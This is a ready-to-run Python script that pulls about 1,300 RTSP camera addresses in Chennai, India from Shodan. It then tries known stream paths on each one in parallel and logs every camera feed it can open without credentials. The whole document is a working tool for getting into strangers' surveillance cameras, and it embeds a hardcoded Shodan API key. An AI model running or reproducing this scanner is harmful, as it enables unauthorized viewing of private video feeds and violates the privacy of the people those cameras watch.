import concurrent.futures
import cv2
import shodan
import time

# Configuration
SHODAN_API_KEY = "4Fq1reBNmuMl5gvmobruY0ChqLa7ICSb"
SEARCH_QUERY = 'port:554 "RTSP/1.0 200 OK" country:"IN" city:"Chennai"'
MAX_WORKERS = 30  # Number of simultaneous connection checks
OUTPUT_FILE = "verified_chennai_streams.txt"

COMMON_PATHS = [
    "",                             # Root path
    "/Streaming/Channels/101",      # Hikvision / modern cams
    "/live/ch0",                    # Generic / Tuya / Anran
    "/cam/realmonitor?channel=1&subtype=0", # Dahua / Amcrest
    "/live.sdp"                     # Hipcam / legacy systems
]

def test_single_ip(ip):
    """Tests an IP address against common RTSP paths with a strict timeout."""
    for path in COMMON_PATHS:
        url = f"rtsp://{ip}:554{path}"
        cap = cv2.VideoCapture(url)

        # Strict 2-second timeout to prevent stalling on 1,300+ targets
        cap.set(cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, 2000)

        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                cap.release()
                # Log to console immediately
                print(f"[+] FOUND OPEN STREAM: {url}")

                # Append directly to file so data is saved instantly
                with open(OUTPUT_FILE, "a") as f:
                    f.write(url + "\n")
                return url
            cap.release()
    return None

def main():
    try:
        api = shodan.Shodan(SHODAN_API_KEY)
        print(f"[*] Initializing mass scan for query: {SEARCH_QUERY}")
        print(f"[*] Results will be streaming directly to: {OUTPUT_FILE}")

        # Step 1: Collect all 1,340 target IPs using the cursor helper
        target_ips = []
        print("[*] Querying Shodan API pages (Gathering all IPs)...")

        # search_cursor automatically handles pagination loops behind the scenes
        for match in api.search_cursor(SEARCH_QUERY):
            target_ips.append(match['ip_str'])
            # Respect Shodan's API rate limits while pulling pages
            time.sleep(0.1)

        total_targets = len(target_ips)
        print(f"[+] Successfully gathered {total_targets} target IPs.")
        print(f"[*] Launching parallel thread pool with {MAX_WORKERS} workers...")

        # Initialize/Clear the output file
        with open(OUTPUT_FILE, "w") as f:
            f.write("# Verified Open RTSP Streams\n")

        # Step 2: Process the entire pool concurrently
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            # Map the function to process the list across threads
            executor.map(test_single_ip, target_ips)

        print("\n" + "="*70)
        print(f"[*] Mass Scan Completed.")
        print(f"[*] All working URLs have been saved to '{OUTPUT_FILE}'.")
        print("="*70)

    except shodan.APIError as err:
        print(f"[!] Shodan API error: {err}")
    except Exception as err:
        print(f"[!] Runtime error: {err}")

if __name__ == "__main__":
    main()
